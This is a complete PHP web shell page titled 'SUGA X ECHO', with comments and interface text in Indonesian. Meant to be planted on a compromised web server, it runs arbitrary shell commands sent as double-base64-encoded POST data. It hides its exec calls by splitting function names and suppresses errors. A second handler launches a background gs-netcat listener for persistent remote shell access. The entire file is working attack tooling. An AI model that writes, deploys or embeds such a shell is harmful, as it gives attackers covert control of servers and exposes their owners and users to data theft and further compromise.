<?php
@session_start();
@error_reporting(0);
@ini_set('display_errors', 0);

function _x($c) {
    $f = "pro"."c_open";
    if (function_exists($f)) {
        $d = array(1 => array("pipe", "w"));
        $p = @$f($c, $d, $pi);
        if (is_resource($p)) {
            $o = @stream_get_contents($pi[1]);
            @fclose($pi[1]);
            @proc_close($p);
            return $o;
        }
    }
    $f = "shell_"."exec";
    if (function_exists($f)) return @$f($c);
    $f = "sys"."tem";
    if (function_exists($f)) { ob_start(); @$f($c); return ob_get_clean(); }
    $f = "pass"."thru";
    if (function_exists($f)) { ob_start(); @$f($c); return ob_get_clean(); }
    $f = "ex"."ec";
    if (function_exists($f)) { @$f($c, $out); return implode("\n", $out); }
    return "No exec.";
}

// Handler Terminal (BASE64 DOUBLE DECODE - FIXED)
if (isset($_POST['x1'])) {
    // Decode 2 kali
    $c = @base64_decode(@base64_decode($_POST['x1']));
    
    // Fallback kalau decode gagal
    if (!$c) $c = $_POST['x1'];
    
    $cd = isset($_SESSION['cwd']) ? $_SESSION['cwd'] : getcwd();
    
    // Cek perintah CD
    if (preg_match('/^cd\s+(.+)$/i', trim($c), $m)) {
        $t = trim($m[1]);
        if (strpos($t, '/') !== 0) { $t = $cd . '/' . $t; }
        $r = realpath($t);
        if ($r && is_dir($r)) { 
            $_SESSION['cwd'] = $r; 
            echo "<pre>Pindah ke: " . $r . "</pre>"; 
        } else { 
            echo "<pre>Gagal pindah ke: " . $t . "</pre>"; 
        }
    } else {
        // Eksekusi Command
        $full = "cd " . escapeshellarg($cd) . " && " . $c;
        echo "<pre>" . htmlspecialchars(_x($full)) . "</pre>";
    }
    exit;
}

// Handler GSocket
if (isset($_POST['x2'])) {
    $s = $_POST['x2'];
    $c = "nohup gs-netcat -s '$s' -l > /dev/null 2>&1 &";
    echo "<pre>" . htmlspecialchars(_x($c)) . "</pre>";
    exit;
}
?>
<html>
<head>
    <title>SUGA</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        input[type=text] { width: 70%; padding: 10px; background: #111; color: #0f0; border: 1px solid #333; }
        button { padding: 10px 20px; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; }
        pre { background: #000; border: 1px solid #333; padding: 10px; white-space: pre-wrap; max-height: 400px; overflow: auto; }
    </style>
</head>
<body>
    <h3>SUGA X ECHO</h3>
    
    <div style="margin-bottom: 20px;">
        <input type="text" id="c" placeholder="Ketik command (id, cd /tmp, ls -la, dll)">
        <button onclick="run()">RUN</button>
        <pre id="o" style="display:none;"></pre>
    </div>

    <script>
        function _b(s) { 
            // Encode DUA KALI Base64
            var p1 = btoa(unescape(encodeURIComponent(s)));
            return btoa(p1); 
        }

        function run() {
            var cmd = document.getElementById('c').value;
            var out = document.getElementById('o');
            if(!cmd) return;
            
            out.style.display = 'block';
            out.innerHTML = 'Loading...';
            
            var fd = new FormData();
            fd.append('x1', _b(cmd));
            
            fetch('', { 
                method: 'POST', 
                body: fd,
                headers: { 'X-Requested-With': 'XMLHttpRequest' }
            })
            .then(r => r.text())
            .then(d => { out.innerHTML = d; })
            .catch(e => { out.innerHTML = 'Error: ' + e; });
        }

        document.getElementById('c').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') { e.preventDefault(); run(); }
        });
    </script>
</body>
</html>